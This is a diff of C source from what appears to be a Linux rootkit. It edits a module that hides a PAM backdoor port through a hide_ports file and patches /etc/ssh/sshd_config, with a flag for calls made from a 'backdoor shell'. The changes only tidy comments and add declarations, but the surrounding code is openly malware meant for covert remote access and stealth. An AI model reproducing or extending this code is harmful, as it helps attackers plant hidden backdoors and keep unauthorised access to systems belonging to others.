@@ -12,18 +12,15 @@ void pam_vsyslog(const pam_handle_t *pamh, int priority, const char *fmt, va_lis
 #include "pam/pam_syslog.c"
 
 /* this is literally only here so that we can write
- * a hidden port to the hide_ports file, and the
- * user knows which port is and isn't for the PAM
- * backdoor. */
+ * a hidden port to the hide_ports file. */
 #define PAM_PORT ??PAM_PORT?? // [USE_PAM_BD]
 
 #ifdef PATCH_SSHD_CONFIG
 
-/* is the size of /etc/ssh/sshd_config's contents
+/* if the size of /etc/ssh/sshd_config's contents
  * is larger than this number, only allocate memory
  * for up to this number. default limit is 8kb. comment out
- * to disable this & allocate the memory regardless of size.
- * not sure even this much is necessary tbh... */
+ * to disable this & allocate the memory regardless of size. */
 #define MAX_SSHD_SIZE 1024 * 8
 
 #define MAGIC_USR 1 // sshdpatch will print stuff out when called from backdoor shell..
@@ -36,12 +33,11 @@ static char *const antival[sizeofarr(patchtargets)]   = {"no",  // what we don't
 static char *const targetval[sizeofarr(patchtargets)] = {"yes", // what we do want.
                                                          "yes"};
 
-/* stores /etc/ssh/sshd_config contents. */
-static char *sshdcontents = NULL;
-
+void addsetting(char *setting, char *value, char **buf);
+size_t writesshd(char *buf, int mode);
 int sshdok(int res[], char **buf, size_t *sshdsize);
 void sshdpatch(int mode);
-#define SSHD_CONFIG "??SSHD_CONFIG??"
+#define SSHD_CONFIG "??SSHD_CONFIG??" // [PATCH_SSHD_CONFIG]
 #include "sshdpatch/sshdchk.c"
 
 #endif
